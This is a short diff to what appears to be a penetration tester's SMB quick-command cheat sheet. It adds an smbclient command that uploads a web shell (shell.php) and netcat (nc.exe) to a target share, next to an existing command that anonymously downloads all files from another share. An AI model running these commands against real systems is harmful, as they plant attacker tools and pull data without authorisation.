@@ -12,5 +12,8 @@
 - ---] Quick Commands
 =====================
 
+# Non interactive file upload
+smbclient \\\\172.16.50.42\\smbshare -U user1 -c "put shell.php; put nc.exe"
+
 # Download all files in SMB
 smbclient '\\10.11.1.31\wwwroot' -N -c 'prompt OFF;recurse ON; mget *'
